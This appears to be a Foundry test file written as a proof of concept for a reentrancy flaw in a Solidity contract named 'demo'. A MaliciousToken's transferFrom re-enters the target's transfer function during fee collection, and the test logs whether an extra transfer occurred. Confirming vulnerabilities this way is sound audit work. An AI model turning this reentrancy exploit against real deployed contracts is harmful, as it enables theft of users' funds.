// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xd5967fed03e85d1cce44cab284695b41bc675b5c.sol";

contract MaliciousToken {
    demo public d;
    ReentrancyTest public test;
    address public feeCollector;
    bool inTransfer;

    constructor(address _demo, address _testContract, address _feeCollector) {
        d = demo(_demo);
        test = ReentrancyTest(_testContract);
        feeCollector = _feeCollector;
    }
    
    function transferFrom(address, address to, uint256) external returns (bool) {
        if (to == feeCollector && !inTransfer) {
            inTransfer = true;
            address[] memory tos = new address[](1);
            tos[0] = address(0xABCD);
            d.transfer(address(this), address(this), tos, 10);
            test.markAsReentered();
            inTransfer = false;
        }
        return true;
    }
}

contract ReentrancyTest is Test {
    demo public d;
    MaliciousToken public token;
    address public feeCollector;
    bool public reentered;

    function setUp() public {
        d = new demo();
        feeCollector = d.feeCollector();
        token = new MaliciousToken(address(d), address(this), feeCollector);
    }
    
    function markAsReentered() public {
        reentered = true;
    }

    function testReentrancyOnFeeTransfer() public {
        // Differential state variable to monitor
        address targetAddr = address(0xABCD);
        
        console.log("--- BEFORE-Trigger State ---");
        uint256 beforeTotalTransfers = d.totalTransfers(targetAddr);
        console.log("Total transfers for 0xABCD: %s", beforeTotalTransfers);
        console.log("Reentered flag: %s", reentered);

        console.log("--- Trigger Transfer (Attack) ---");
        address[] memory recipients = new address[](1);
        recipients[0] = address(0x123);
        d.transfer(address(this), address(token), recipients, 1000);
        
        console.log("--- AFTER-Trigger State ---");
        uint256 afterTotalTransfers = d.totalTransfers(targetAddr);
        console.log("Total transfers for 0xABCD: %s", afterTotalTransfers);
        console.log("Reentered flag: %s", reentered);

        // Vulnerability validation checks
        bool stateChangeOccurred = afterTotalTransfers > beforeTotalTransfers;
        bool reentrancyOccurred = reentered;
        
        console.log("State changed (extra transfer): %s", stateChangeOccurred ? "Yes" : "No");
        console.log("Reentrancy occurred: %s", reentrancyOccurred ? "Yes" : "No");
        
        // Final vulnerability verdict
        if (reentrancyOccurred && stateChangeOccurred) {
            console.log("Vulnerability Exists: Reentrancy attack occurred and caused an extra transfer of 10 tokens to address(0xABCD)");
        } else if (!reentrancyOccurred) {
            console.log("Vulnerability not Exist: Reentrancy attack did not occur (reentered flag not set)");
        } else {
            console.log("Vulnerability not Exist: Reentrancy occurred but state change did not happen as expected");
        }
    }
}